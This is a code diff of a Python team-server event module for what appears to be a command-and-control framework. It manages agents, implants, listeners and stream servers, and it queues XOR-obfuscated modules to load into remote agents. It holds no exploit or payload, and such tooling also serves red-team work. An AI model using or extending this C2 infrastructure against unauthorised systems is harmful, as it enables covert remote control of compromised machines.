@@ -1,63 +1,41 @@
 import hashlib
-import json
 import os
 
-from connect.convert import string_to_base64, xor_base64
+from connect.convert import xor_base64
 from connect.server.models import AgentModel, ImplantModel, TaskModel, get_session
-from functools import wraps
-from connect.listener import listener_manager
+from connect.stream.manager import StreamServerManager
+from connect.server.tasks import TaskManager
+from connect.listener.manager import ListenerManager
 
 
 class TeamServerEvents:
 
-    def __init__(self, app, key, sio_server, socks_manager):
+    def __init__(self, app, key, sio_server):
         self.app = app
         self.key = key
         self.sio_server = sio_server
-        self.socks_manager = socks_manager
         self.sio_server.on('agent', self.agent)
         self.sio_server.on('connect', self.connect)
         self.sio_server.on('implant', self.implant)
         self.sio_server.on('task', self.task)
         self.sio_server.on('listener', self.listener)
+        self.sio_server.on('streamer', self.streamer)
+        self.stream_server_manager = StreamServerManager(self.sio_server)
+        self.task_manger = TaskManager(self.sio_server)
+        self.listener_manager = ListenerManager()
 
     async def connect(self, sid, environ, auth: str = 'no key provided'):
         if auth != self.key:
             await self.sio_server.disconnect(sid)
             return
 
-    def json_event_handler(handler_function):
-        @wraps(handler_function)
-        async def decorated_handler(self, *args):
-            if not args:
-                await self.sio_server.emit('error', f'No data provided to {handler_function.__name__}.')
-                return
-
-            try:
-                deserialized_json = json.loads(args[1])
-            except json.JSONDecodeError:
-                await self.sio_server.emit('error', f'Invalid JSON provided to {handler_function.__name__} event: {args[0]}')
-                return
-
-            await handler_function(self, deserialized_json)
-
-        return decorated_handler
-
-    @json_event_handler
-    async def agent(self, data):
+    async def agent(self, sid, data):
         list_agent = data.get('list', None)
         with get_session() as session:
             if list_agent:
                 seconds = int(list_agent.get('seconds'))
                 agents = [agent.get_agent() for agent in session.query(AgentModel).all() if
                           0 <= agent.get_delta_seconds() <= seconds]
-                for agent in agents:
-                    agent['socks'] = '•' * 4
-                    try:
-                        socks_server = self.socks_manager.socks_servers[agent['id']]
-                        agent['socks'] = f'{socks_server.port}'
-                    except KeyError:
-                        continue
                 if not agents:
                     await self.sio_server.emit('information', 'There are no agents')
                     return
@@ -66,9 +44,7 @@ class TeamServerEvents:
 
             await self.sio_server.emit('information', f'Agent event hit with the following data: {data}')
 
-    # Event handler for implant actions
-    @json_event_handler
-    async def implant(self, data):
+    async def implant(self, sid, data):
         create_implant = 'create' in data.keys()
         list_implant = 'list' in data.keys()
         with get_session() as session:
@@ -89,9 +65,7 @@ class TeamServerEvents:
 
             await self.sio_server.emit('information', f'Implant event hit with the following data: {data}')
 
-    # Event handler for task actions
-    @json_event_handler
-    async def task(self, data):
+    async def task(self, sid, data):
         create_task = data.get('create', None)
         with get_session() as session:
             if create_task:
@@ -101,17 +75,14 @@ class TeamServerEvents:
                     await self.sio_server.emit('error', f'Agent `{create_task["agent"]}` does not exist.')
                     return
 
-                parameters = ','.join(parameter for parameter in create_task.get('parameters',
-                                                                                 []))  # ToDo: If parameters are provided that are not a list then break
-                misc = ','.join(parameter for parameter in
-                                create_task.get('misc', []))  # ToDo: If misc is provided that is not a list then break
+                parameters = ','.join(parameter for parameter in create_task.get('parameters', []))  # ToDo: If parameters are provided that are not a list then break
+                misc = ','.join(parameter for parameter in create_task.get('misc', []))  # ToDo: If misc is provided that is not a list then break
                 module = create_task.get('module', None)
 
                 if not await self.load_module(agent, module, session):
                     return
 
-                new_task = TaskModel(agent=agent, method=create_task['method'], type=create_task['type'],
-                                     parameters=parameters, misc=misc)
+                new_task = TaskModel(agent=agent, method=create_task['method'], type=create_task['type'], parameters=parameters, misc=misc)
                 session.add(new_task)
                 await self.sio_server.emit('information', f'Scheduled task for method: `{new_task.method}`')
                 return
@@ -129,7 +100,7 @@ class TeamServerEvents:
         if module_md5 in agent.loaded_modules:
             return True
         module, key = xor_base64(module_bytes)
-        parameters = ','.join([string_to_base64(module), string_to_base64(key)])
+        parameters = ','.join([module, key])
         new_task = TaskModel(agent=agent, method='load', type=1, parameters=parameters, misc='')
         session.add(new_task)
         await self.sio_server.emit('information', f'Scheduled task for method: `{new_task.method}`')
@@ -138,26 +109,47 @@ class TeamServerEvents:
         session.add(agent)
         return True
 
-    @json_event_handler
-    async def listener(self, data):
+    async def listener(self, sid, data):
         create_listener = data.get('create', None)
         stop_listener = data.get('stop', None)
         list_listener = 'list' in data.keys()
 
         if create_listener:
-            await listener_manager.create_listener(create_listener['ip'], create_listener['port'], self.socks_manager, self.sio_server)
+            await self.listener_manager.create_listener(create_listener['ip'], create_listener['port'], self.task_manger, self.sio_server, self.stream_server_manager)
             return
 
         if stop_listener:
-            await listener_manager.stop_listener(stop_listener['ip'], stop_listener['port'], self.sio_server)
+            await self.listener_manager.stop_listener(stop_listener['ip'], stop_listener['port'], self.sio_server)
             return
 
         if list_listener:
-            listeners = listener_manager.get_listeners()
+            listeners = self.listener_manager.get_listeners()
             if not listeners:
-                await self.sio_server.emit('information', 'There are no listeners.')
+                await self.sio_server.emit('information', 'There are no listeners')
                 return
             await self.sio_server.emit('listeners', listeners)
             return
 
         await self.sio_server.emit('information', f'Listener event hit with the following data: {data}')
+
+    async def streamer(self, sid, data):
+        create_streamer = data.get('create', None)
+        list_streamers = 'list' in data.keys()
+
+        if create_streamer:
+            agent_id = create_streamer['agent_id']
+            stream_server_type = create_streamer['type']
+            ip = create_streamer['ip']
+            port = create_streamer['port']
+            await self.stream_server_manager.create_stream_server(stream_server_type, agent_id, ip, port)
+            return
+
+        if list_streamers:
+            streamers = self.stream_server_manager.get_streamers()
+            if not streamers:
+                await self.sio_server.emit('information', 'There are no streamers')
+                return
+            await self.sio_server.emit('streamers', streamers)
+            return
+
+        await self.sio_server.emit('information', f'Streamer event hit with the following data: {data}')
